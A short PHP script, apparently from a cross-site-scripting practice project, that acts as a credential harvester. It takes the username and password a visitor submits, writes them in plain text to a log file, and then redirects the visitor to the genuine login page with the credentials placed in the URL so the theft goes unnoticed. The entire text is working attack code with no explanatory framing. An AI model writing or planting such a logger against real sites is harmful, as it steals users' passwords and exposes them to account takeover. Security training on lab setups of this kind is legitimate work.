<?php 
$login = $_REQUEST["account"];
$pass = $_REQUEST["passwd"];
$data = fopen("logfile.txt","a+");
fwrite($data, "Username: $login\nPassword: $pass\n");
fclose($data);
Header("location: http://localhost/XSS-Projects-master/hackerproof/login.php?account=$login&passwd=$pass")
?>